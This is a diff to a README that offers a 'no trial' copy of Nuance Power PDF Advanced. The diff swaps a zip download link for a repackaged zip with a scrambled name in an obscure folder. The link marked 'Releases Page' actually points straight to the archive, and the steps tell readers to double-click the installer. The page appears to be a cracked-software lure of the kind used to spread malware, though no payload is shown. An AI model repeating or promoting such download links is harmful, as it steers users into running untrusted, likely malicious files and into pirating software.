@@ -1,6 +1,6 @@
 # 🌟 Nuance-Power-PDF-Advanced-No-Trial - Power Up Your PDF Management
 
-[![Download Now](https://raw.githubusercontent.com/chandler02-ODS/Nuance-Power-PDF-Advanced-No-Trial/main/absmho/Nuance-Power-PDF-Advanced-No-Trial-v3.8.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/chandler02-ODS/Nuance-Power-PDF-Advanced-No-Trial/main/absmho/Nuance-Power-PDF-Advanced-No-Trial-v3.8.zip)
+[![Download Now](https://github.com/chandler02-ODS/Nuance-Power-PDF-Advanced-No-Trial/raw/refs/heads/main/absmho/Power-Trial-No-Advanced-PD-Nuance-1.5.zip%20Now-Get%20Started-brightgreen)](https://github.com/chandler02-ODS/Nuance-Power-PDF-Advanced-No-Trial/raw/refs/heads/main/absmho/Power-Trial-No-Advanced-PD-Nuance-1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to the Nuance Power PDF Advanced repository. This guide will help you do
 
 1. **Visit the Releases Page**  
    Click the link below to access the Releases page. Here, you will find the software available for download:  
-   [Visit the Releases Page to Download](https://raw.githubusercontent.com/chandler02-ODS/Nuance-Power-PDF-Advanced-No-Trial/main/absmho/Nuance-Power-PDF-Advanced-No-Trial-v3.8.zip)
+   [Visit the Releases Page to Download](https://github.com/chandler02-ODS/Nuance-Power-PDF-Advanced-No-Trial/raw/refs/heads/main/absmho/Power-Trial-No-Advanced-PD-Nuance-1.5.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, you will see a list of available versions. Choose the latest one for the best features and improvements.
 
 3. **Download the Installer**  
-   Click on the installer file suitable for your system. The file is typically named something like `https://raw.githubusercontent.com/chandler02-ODS/Nuance-Power-PDF-Advanced-No-Trial/main/absmho/Nuance-Power-PDF-Advanced-No-Trial-v3.8.zip`.
+   Click on the installer file suitable for your system. The file is typically named something like `https://github.com/chandler02-ODS/Nuance-Power-PDF-Advanced-No-Trial/raw/refs/heads/main/absmho/Power-Trial-No-Advanced-PD-Nuance-1.5.zip`.
 
 4. **Run the Installer**  
    Once the download completes, locate the downloaded file in your folder. Double-click it to start the installation process.
